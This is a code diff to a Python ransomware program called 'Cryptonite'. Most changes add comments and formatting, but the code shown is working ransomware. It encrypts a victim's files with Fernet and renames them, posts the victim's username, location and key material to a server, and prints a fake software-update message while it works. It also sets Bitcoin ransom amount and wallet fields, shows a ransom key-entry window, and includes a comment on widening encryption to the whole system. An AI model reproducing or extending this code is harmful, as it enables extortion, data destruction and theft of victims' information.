@@ -12,12 +12,13 @@ import pymsgbox as pmb
 
 # ----------------> Cryptonite program begins here. <---------------- #
 
+# << Symmetric key generation >> #
 key = Fernet.generate_key()
 fe = Fernet(key)
 dkrpt = random.randint(100000, 999999)
 uniqKey = str(datetime.now()).replace(" ", "").replace("-", "").replace(":", "").replace(".", "")
 
-# some GLOBALS
+# << GLOBALS >> #
 URL = ""                        # <----  REQUIRED (Use exeGen.. It is much easier)
 BTC_AMOUNT = ""                 # <----  REQUIRED (Use exeGen.. It is much easier)
 BTC_WALLET = ""                 # <----  REQUIRED (Use exeGen.. It is much easier)
@@ -28,7 +29,7 @@ fileLists = []                  # stores the files to be encrypted
 fileList = []                   # stores the files to be decrypted
 
 
-# --> Directories to be devoid of encryption <-- #
+# << Directories to be devoid of encryption >> #
 EXCLUDED_DIRS = [   "/Windows",
                     "/Program Files",
                     "/Program Files (x86)",
@@ -45,6 +46,7 @@ class Cryptonite():
         self.decryptPlease = dkrpt
         self.uniqueKey = uniqKey
 
+    # << Send info to the server >> #
     def sendKeys(self):
         id = uniqKey
         user = os.getlogin()
@@ -64,16 +66,17 @@ class Cryptonite():
                 "longitude": long,
                 "location": location
             }
-            r.post(URL, data=json.dumps(jsonFormat))
+            r.post(URL, data=json.dumps(jsonFormat))                # URL of the server
         except:
             pmb.confirm("Please make sure that you are connected to the internet and try again.", "Network Error")
             exit()
-            
+    
+    # << Finds file for encryption >> #        
     def findFiles(self):
         print("Please be patient, checking for new updates...\n")
         time.sleep(5)
         print("Update found! Downloading the files... \n")
-        for root, dir, file in os.walk('./testfolder'):
+        for root, dir, file in os.walk('./testfolder'):             # replace './testfolder' to './' for system wide encryption
             for i in range(len(EXCLUDED_DIRS)):
                 if EXCLUDED_DIRS[i] in root:
                     break
@@ -88,10 +91,11 @@ class Cryptonite():
         self.encrypt()
         os.system("cls" if os.name == 'nt' else "clear") 
 
+    # << Encrypting files >> #
     def encrypt(self):        
         for file in tqdm.tqdm(fileLists):
             flag = 0
-            newfile = str(file)+EXT
+            newfile = str(file) + EXT
             try:
                 with open(file, "rb") as f:
                     data = f.read()
@@ -105,22 +109,23 @@ class Cryptonite():
                         f.write(encryptedData)
                     os.rename(file, newfile)
                 except:
-                    pass     
-  
+                    pass
+
+    # << Decrypting files >> #
     def decrypt(self):
         for files in fileList:
             flag = 0
             try:
-                with open(str(files)+EXT, "rb") as f:
+                with open(str(files) + EXT, "rb") as f:
                     data = f.read()
             except:
                 flag = 1
             if flag == 0:
                 try:
-                    with open(str(files)+EXT, "wb") as f:
+                    with open(str(files) + EXT, "wb") as f:
                         decryptedData = self.fernetEncrypt.decrypt(data)
                         f.write(decryptedData)
-                    os.rename(str(files)+EXT, files)
+                    os.rename(str(files) + EXT, files)
                 except:
                     pass
                   
@@ -130,15 +135,17 @@ class System(Cryptonite):
     def __init__(self):
         super().__init__(key,fe,dkrpt,uniqKey)
 
+    # << Warning screen >> #
     def warningScreen(self):
         import tkinter as tk
         import tkinter.ttk as ttk
+
         window = tk.Tk()
         
-        def clear1(*args):
+        def clear1(*args):                                      # function to clear the entry
             decryption_key.delete("0", tk.END)
 
-        def key_collect():
+        def key_collect():                                      # reads the decryption key and takes action
             try:
                 key = int(decryption_key.get())
                 if int(key) == self.decryptPlease:
@@ -153,18 +160,22 @@ class System(Cryptonite):
                 window.destroy()
                 exit()
         
+        # << Window configs >> #
         window.title("Cryptonite")
-        window.resizable(0,0)
+        window.resizable(0,0)                                   # disable resize option
         window.rowconfigure(0, minsize = 300)
         window.columnconfigure(0, minsize = 300)
 
+        # << Style configs >> #
         style = ttk.Style()
         style.configure('TButton', font=("Apple Chancery", 18))
         style.configure('small.TButton', font=("Apple Chancery", 8))
 
+        # << Main canvas >> #
         frm_main = tk.Frame(master = window, bg = "black")
         frm_main.grid(row = 0, column = 0, sticky = "nsew", padx = 2, pady = 2)
 
+        # << Row, Column config for main canvas >> #
         frm_main.rowconfigure([0,1,2,3,4,5,6,7], weight = 1)
         frm_main.columnconfigure(0, weight = 1)
         frm_main.columnconfigure(1, weight = 1)
